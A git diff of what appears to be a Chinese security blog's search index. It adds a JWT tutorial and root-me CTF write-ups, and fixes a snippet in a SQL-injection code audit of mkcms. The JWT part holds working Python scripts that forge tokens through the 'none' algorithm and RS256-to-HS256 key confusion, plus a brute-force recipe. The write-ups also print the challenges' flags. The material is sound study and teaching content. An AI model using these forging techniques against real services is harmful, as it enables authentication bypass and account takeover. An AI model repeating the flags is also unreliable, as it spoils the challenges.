@@ -213,7 +213,7 @@
 <p>sqlmap一把梭</p>
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfgqe8cju8j317s0u04qp.jpg" alt="image-20200605003950434"></p>
 <h3 id="0x05-密码找回处SQL注入"><a href="#0x05-密码找回处SQL注入" class="headerlink" title="0x05 密码找回处SQL注入"></a>0x05 密码找回处SQL注入</h3><p>漏洞存在点：ucenter/repass.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$username = stripslashes(trim($_POST[<span class="string">'name'</span>]));<span class="comment">//漏洞点，post方式使用</span></span><br><span class="line">$sql = <span class="string">'update mkcms_user set '</span>.arrtoupdate($_data).<span class="string">' where u_name="'</span>.$username.<span class="string">'"'</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (mysql_query($sql)) </span><br><span class="line"><span class="comment">//删除多余代码保留漏洞代码，可以看见此处代码与用户注册处的代码一样，都是post获取了参数，然后使用stripslashes反向转义，然后直接拼接带入到数据库查询</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$username = stripslashes(trim($_POST[<span class="string">'name'</span>]));<span class="comment">//漏洞点，post方式使用</span></span><br><span class="line">$sql = <span class="string">'update mkcms_user set '</span>.arrtoupdate($_data).<span class="string">' where u_name="'</span>.$username.<span class="string">'"'</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (mysql_query($sql)) </span><br><span class="line"><span class="comment">//删除多余代码保留漏洞代码，可以看见此处代码与用户注册处的代码一样，都是post获取了参数，然后使用stripslashes反向转义，然后直接拼接带入到数据库查询</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfgqub42nsj30v40imqey.jpg" alt="image-20200605005520362"></p>
 <p>知道作者使用了stripslashes函数反向转义后，可以直接定位此函数来寻找SQL注入</p>
@@ -804,5 +804,617 @@
       <tags>
         <tag>后渗透工具</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Thinkphp注入学习(暂未更新)</title>
+    <url>/2020/06/13/Thinkphp%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfpzs12ludj31c00u0tfe.jpg" alt="74"></p>
+<a id="more"></a>
+
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>Thinkphp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jwt学习</title>
+    <url>/2020/06/27/jwt%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gg77oqkz42j31hc0u0jzn.jpg" alt="46"></p>
+<a id="more"></a>
+
+<h3 id="0x00-什么是JWT"><a href="#0x00-什么是JWT" class="headerlink" title="0x00 什么是JWT"></a>0x00 什么是JWT</h3><p>JWT是Json Web Token的缩写，主要用于验证用户身份信息及跨域的身份验证。</p>
+<h3 id="0x01-JWT构成部分"><a href="#0x01-JWT构成部分" class="headerlink" title="0x01 JWT构成部分"></a>0x01 JWT构成部分</h3><p>JWT一般是由三部分组成。</p>
+<h4 id="Header-标头"><a href="#Header-标头" class="headerlink" title="Header(标头)"></a>Header(标头)</h4><p>​    标头通常由两部分组成：令牌的类型和所使用的签名算法，例如HMACSHA256或RSA</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Header头部承载两部分信息</span><br><span class="line">	1、声明类型，JWT</span><br><span class="line">	2、声明加密算法	</span><br><span class="line"></span><br><span class="line">header &#x3D; &#39;&#123;</span><br><span class="line">		&quot;alg&quot;:&quot;HS256&quot;,&#x2F;&#x2F;算法</span><br><span class="line">		&quot;typ&quot;:&quot;JWT&quot; &#x2F;&#x2F;JWT传递</span><br><span class="line">		&#125;&#39;</span><br><span class="line">		</span><br><span class="line">使用base64URL编码，形成JWT的第一部分</span><br></pre></td></tr></table></figure>
+
+<h4 id="Payload-有效载荷"><a href="#Payload-有效载荷" class="headerlink" title="Payload(有效载荷)"></a>Payload(有效载荷)</h4><p>​    主体信息(有效载荷)，其中包含声明，声明是有关实体(一般是用户)和其他数据的声明。索赔有以下三种类型：</p>
+<p>注册的，公共的和私人权利</p>
+<ul>
+<li><p>已注册的权利要求：</p>
+<p>  ​    这些是一组非强制性的但建议使用的预定义权利要求，以提供一组有用的可互操作的权利要求。其中一些是： <strong>iss</strong>(主题)， <strong>exp</strong>(到期时间)， <strong>sub</strong>(主题)， <strong>aud</strong>(受众)等。</p>
+</li>
+<li><p>公开声明：</p>
+<p>  ​    使用JWT的人员可以随意定义这些声明。但为避免冲突，应在<strong>IANA JSON Web令牌注册表</strong>中定义它们，或将其定义为包含抗冲突名称空间的URI。</p>
+</li>
+<li><p>私人权利：</p>
+<p>  ​    这些都是使用它们同意并既不是当事人之间建立共享信息的自定义声明<em>注册</em>或<em>公众</em>的权利要求。</p>
+<p>  ​        </p>
+<p>  官方规定的七个字段(不强制要求选择，也可以自定义字段)</p>
+<ul>
+<li><strong>iss (issuer)：签发人</strong></li>
+<li><strong>exp (expiration time)：过期时间</strong></li>
+<li><strong>sub (subject)：主题</strong></li>
+<li><strong>aud (audience)：受众</strong></li>
+<li><strong>nbf (Not Before)：生效时间</strong></li>
+<li><strong>iat (Issued At)：签发时间</strong></li>
+<li><strong>jti (JWT ID)：编号</strong></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;&#123;</span><br><span class="line">	&quot;loggedInAs&quot;:&quot;admin&quot;,</span><br><span class="line">	&quot;iat&quot;:1422779638</span><br><span class="line">	&#125;&#39;&#x2F;&#x2F;iat表示令牌生成的时间</span><br><span class="line"></span><br><span class="line">使用base64URL编码，形成JWT的第二部分</span><br></pre></td></tr></table></figure>
+
+<h4 id="Signature-签名"><a href="#Signature-签名" class="headerlink" title="Signature(签名)"></a>Signature(签名)</h4><p>​    签名，要创建签名部分，您必须获取编码的标头，编码的有效载荷，机密，标头中指定的算法，并对其进行签名。</p>
+<p>​    如果要使用HMAC SHA256算法，则将通过以下方式创建签名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line"> #第一部分</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line"> #第二部分</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line"> #秘钥</span><br><span class="line">  secret)</span><br><span class="line">  </span><br><span class="line"> 使用base64Url编码后组成第三部分</span><br><span class="line"> </span><br><span class="line"> 最后将第一部分.第二部分.第三部分使用.连接组成一段完整的JWT令牌</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x03-Python生成jwt-web-token"><a href="#0x03-Python生成jwt-web-token" class="headerlink" title="0x03 Python生成jwt web token"></a>0x03 Python生成jwt web token</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"HS256"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payloda = &#123;</span><br><span class="line">    <span class="string">"iat"</span>:time.time(),</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"admin"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#调用jwt库，生成json web token</span></span><br><span class="line"><span class="comment">#							 秘钥      加密算法</span></span><br><span class="line">jwt_token = jwt.encode(payload,<span class="string">"1121"</span>,algorithm=<span class="string">"HS256"</span>,headers=head).decode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure>
+
+<p>生成的token</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTUwNzM1NDguNjcyNzk2LCJuYW1lIjoiYWRtaW4ifQ.m_f32qmeuFTCugdPBfMA1jGmpkXWoI3Vjt-sY30_xrw</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-Python解密JWT"><a href="#0x04-Python解密JWT" class="headerlink" title="0x04 Python解密JWT"></a>0x04 Python解密JWT</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要解码的token</span></span><br><span class="line">jwt_token = <span class="string">"eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTUwNzM1NDguNjcyNzk2LCJuYW1lIjoiYWRtaW4ifQ.m_f32qmeuFTCugdPBfMA1jGmpkXWoI3Vjt-sY30_xrw"</span></span><br><span class="line"></span><br><span class="line">data = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#							 秘钥</span></span><br><span class="line">    data = jwt.decode(jwt_token,<span class="string">"1121"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
+
+<p>解密内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;iat&#39;: 1595073548.672796, &#39;name&#39;: &#39;admin&#39;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-攻击手法"><a href="#0x05-攻击手法" class="headerlink" title="0x05 攻击手法"></a>0x05 攻击手法</h3><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>因header和payload部分是使用可逆的base64方法编码，所以只要获取到令牌就可以将前两个部分解密后读取内容。</p>
+<p>解密方法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux base64 </span><br><span class="line">	echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d</span><br><span class="line"> 		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line"></span><br><span class="line">浏览器JavaScript控制台</span><br><span class="line">	atob(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;)</span><br><span class="line"> 		&quot;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">Powershell</span><br><span class="line">	[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String</span><br><span class="line">	(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;))</span><br><span class="line">		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line">		</span><br><span class="line">Python</span><br><span class="line">	import base64</span><br><span class="line">	print(base64.b64decode(&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&#39;))</span><br><span class="line">		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="修改签名算法-none"><a href="#修改签名算法-none" class="headerlink" title="修改签名算法(none)"></a>修改签名算法(none)</h4><p>JWT签名算法可确保JWT在传输过程中不会被恶意用户所篡改，但头部的alg字段可以改为none，若服务器支持签名算法为none，服务器会在JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源码：https:&#x2F;&#x2F;github.com&#x2F;Sjord&#x2F;jwtdemo</span><br><span class="line">dmeo：http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;hs256.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfipcuumj319x0bzabr.jpg" alt="image-20200720143830616"></p>
+<p>发送上面的JWT令牌</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfk7d7myj30re0jx409.jpg" alt="image-20200720143958715"></p>
+<p>将alg修改为none</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"none"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"iat"</span>:time.time(),</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"time"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#调用jwt库，生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload,<span class="string">""</span>,algorithm=<span class="string">"none"</span>,headers=head).decode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成令牌</span></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJqd3QiLCJhbGciOiJub25lIn0.eyJpYXQiOjE1OTUyMjgwNzEuNjk0MjQ1LCJuYW1lIjoidGltZSJ9.</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfzr7t71j30pr0gcgn0.jpg" alt="image-20200720145455991"></p>
+<h4 id="修改RS256算法为HS256"><a href="#修改RS256算法为HS256" class="headerlink" title="修改RS256算法为HS256"></a>修改RS256算法为HS256</h4><p>HS256算法使用密钥为所有消息进行签名和验证，而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">demo:http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;rs256.php</span><br><span class="line">公钥：http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;public.pem</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxj6ohnsgj30xn09rgmr.jpg" alt="image-20200720164522770"></p>
+<p>获取网站公钥，将算法改为HS256然后使用泄露的公钥进行签名，服务器会使用HS256和泄露的公钥进行验证。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">    <span class="string">"-----BEGIN PUBLIC KEY-----"</span>,</span><br><span class="line">    <span class="string">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF"</span>,</span><br><span class="line">    <span class="string">"NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c"</span>,</span><br><span class="line">    <span class="string">"1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+"</span>,</span><br><span class="line">    <span class="string">"H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f"</span>,</span><br><span class="line">    <span class="string">"ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw"</span>,</span><br><span class="line">    <span class="string">"2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF"</span>,</span><br><span class="line">    <span class="string">"KwIDAQAB"</span>,</span><br><span class="line">    <span class="string">"-----END PUBLIC KEY-----"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">"\n"</span> . join(key)</span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"time"</span>&#125;,algorithm=<span class="string">"HS256"</span>,key=key+<span class="string">"\n"</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line"></span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#jwt：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoidGltZSJ9.CAyhfU2pH5L1Ua-bferA4XGvcpwOjxUpG6PkiQ5GYBQ</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxj8782ymj30ok0ca74z.jpg" alt="image-20200720164650350"></p>
+<h4 id="破解HS256密钥"><a href="#破解HS256密钥" class="headerlink" title="破解HS256密钥"></a>破解HS256密钥</h4><p>如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候情况就是如此。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装pyjwt</span><br><span class="line">	pip3 install pyjwt</span><br><span class="line">爆破脚本</span><br><span class="line">	https:&#x2F;&#x2F;github.com&#x2F;Devllench&#x2F;jwtbrute</span><br><span class="line">字典：</span><br><span class="line">	https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;master&#x2F;Passwords&#x2F;Common-Credentials&#x2F;10-million-password-list-top-1000000.txt</span><br><span class="line"></span><br><span class="line">命令格式：</span><br><span class="line">	python jwtbrute.py  回车</span><br><span class="line">	input token: jwt令牌</span><br><span class="line">	input wordlist: 字典</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxp0e1tcyj30mw02n0sw.jpg" alt="image-20200720200655836"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxp1r8842j30my0dk40u.jpg" alt="image-20200720200814835"></p>
+<h3 id="0x06-CTF练习"><a href="#0x06-CTF练习" class="headerlink" title="0x06 CTF练习"></a>0x06 CTF练习</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">练习地址：</span><br><span class="line">https:&#x2F;&#x2F;www.root-me.org&#x2F;?page&#x3D;recherche&amp;lang&#x3D;fr&amp;recherche&#x3D;jwt</span><br></pre></td></tr></table></figure>
+
+<h4 id="JSON-Web-Token-JWT-Introduction"><a href="#JSON-Web-Token-JWT-Introduction" class="headerlink" title="JSON Web Token (JWT) - Introduction"></a>JSON Web Token (JWT) - Introduction</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">题目：</span><br><span class="line">http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch58&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggvdtp8enyj30xp0esabd.jpg" alt="image-20200718200846778"></p>
+<p>尝试登陆抓包，没有获取到任何有用信息，发现登陆框有个黄色的login as guest，点击抓包放包后返回一串JWT令牌信息</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggx9df6btdj30rm0c7q4z.jpg" alt="image-20200720110552172"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk</span><br></pre></td></tr></table></figure>
+
+<p>去jwt.io网站解密</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggx9plgyotj30y60jtjth.jpg" alt="image-20200720111733732"></p>
+<p>发现有效载荷的用户是guest，所以尝试一波改成admin能行不，但如果修改用户为admin，需要重新生成一下令牌，而现在不知道密钥，可以尝试爆破一波，看看是否能爆破出来。没有爆出来，就有点难受了。。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpe5j9vcj30nf0ciq5e.jpg" alt="image-20200720202009464"></p>
+<p>尝试修改签名算法，由于jwt.io不支持none算法，所以使用python生成</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;, algorithm=<span class="literal">None</span>,key=<span class="literal">None</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpkcrasmj30i40310sy.jpg" alt="image-20200720202607012"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpnp4es4j30rb0h2tca.jpg" alt="image-20200720202919816"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag : S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="RootMe的JSON-Web-Token-JWT-Weak-secret"><a href="#RootMe的JSON-Web-Token-JWT-Weak-secret" class="headerlink" title="RootMe的JSON Web Token (JWT) - Weak secret"></a>RootMe的JSON Web Token (JWT) - Weak secret</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">题目：http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch59&#x2F;hello</span><br></pre></td></tr></table></figure>
+
+<p>打开网站后得到一段提示</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxprp99vmj319304raba.jpg" alt="image-20200720203310610"></p>
+<p>网翻后。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpsti4csj30vg0363z1.jpg" alt="image-20200720203415144"></p>
+<p>先访问/token</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxptovdl3j311m03uwfj.jpg" alt="image-20200720203505773"></p>
+<p>得到令牌</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw</span><br></pre></td></tr></table></figure>
+
+<p>然后使用post方式访问/admin</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpvx0sebj30r508ydh6.jpg" alt="image-20200720203713901"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">添加Authorization: Bearer YOURTOKEN字段</span><br><span class="line">在请求中添加获取到的令牌</span><br><span class="line"></span><br><span class="line">Authorization: Bearer  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq9b91uqj30r40b7gno.jpg" alt="image-20200720205006225"></p>
+<p>提示爆破。。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpzgu8y1j30lx0cxtav.jpg" alt="image-20200720204038201"></p>
+<p>成功 key是lol</p>
+<p>然后去jwt.io生成令牌</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq3jxmx2j30yw0isq55.jpg" alt="image-20200720204434250"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq7zw0kgj30qy0bfwgg.jpg" alt="image-20200720204850352"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: PleaseUseAStrongSecretNextTime</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="RootMe-JSON-Web-Token-JWT-Public-key"><a href="#RootMe-JSON-Web-Token-JWT-Public-key" class="headerlink" title="RootMe JSON Web Token (JWT) - Public key"></a>RootMe JSON Web Token (JWT) - Public key</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">题目：</span><br><span class="line">	http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch60&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqgev14ej30op05j74r.jpg" alt="image-20200720205202880"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqc9md4tj30d306taae.jpg" alt="image-20200720205256815"></p>
+<p>首先查看key,貌似很熟悉，就是我们刚刚说过的修改RS256为HS256算法，直接上脚本</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqcn4u45j319l0660uq.jpg" alt="image-20200720205318430"></p>
+<p>然后使用post方式访问/auth</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqgftgz2j30rc07zmyp.jpg" alt="image-20200720205628778"></p>
+<p>提示需要添加username字段</p>
+<p>成功获取token</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqh8dc3lj30ri0a1mzf.jpg" alt="image-20200720205743206"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbWUifQ.AWLoeQgDwlTs5q2_32D0rjfKjDJXmUo6r31VVireLpuWaIo3y_xJFHXAGeDhP9l2f1TSDDLO-5o-vIp3Fb9zacQUIw4ZdBcFxSobbHHYxsxuaMhH4kVsgWU1Pg5DRAgufA3c-evuq54byYWWRMgod4P-icMZxkJ1vLxCget5xLIE62qyFBkG4nK6oszmg_wkzK-O5PMUtC_eitO9PAVdR-2JcSSV8tSITEmoBzAK90RGqKQ1sBbm29xtStkZr2TsNo1NT2lrnzaROCO46uQEC7RWbA6kf37oZOF2JOVKQLTnHsobXKPrtKs7MvLwjXkJ1rM3mpvv9ZAE2ePJ7ByBpQ</span><br></pre></td></tr></table></figure>
+
+<p>RS256算法</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqiejyblj30zc0kojvi.jpg" alt="image-20200720205850313"></p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">        <span class="string">"-----BEGIN PUBLIC KEY-----"</span>,</span><br><span class="line">        <span class="string">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwInLJZXYC/eZ5BbRDrd0"</span>,</span><br><span class="line">        <span class="string">"+IKB7Hc9u/tjZFVGmS6aVW4MSEzkgdJYx5tM9yEc4XGdKy2JJVmZCogya4xvYdC7"</span>,</span><br><span class="line">        <span class="string">"RDqsZLPYlBIoG7KAWjJA6VR4YBcv+2TyamSiYVgXC9p6oe4kvg23lfGB74i8lPZ3"</span>,</span><br><span class="line">        <span class="string">"13Er2Ohj1L1mEBEl1lMDiCHTBCOyCWnsnZJcUWeZcUxCJBimF4RNS5x/H3cs/uVg"</span>,</span><br><span class="line">        <span class="string">"A+f5XM0XW6Fp6WIN/wZmIwBE58LWRM3LRZAY2r+JQ2Zp47tmNkr3Z5Ifk2hLKbjx"</span>,</span><br><span class="line">        <span class="string">"VOjVi86qKnloXfW5Y18M2qFWnwIWvtIJBFN4og8Ms4XVOB9HudyUiblkywZzSq9D"</span>,</span><br><span class="line">        <span class="string">"NwIDAQAB"</span>,</span><br><span class="line">        <span class="string">"-----END PUBLIC KEY-----"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">"\n"</span> . join(key)</span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;,key=key+<span 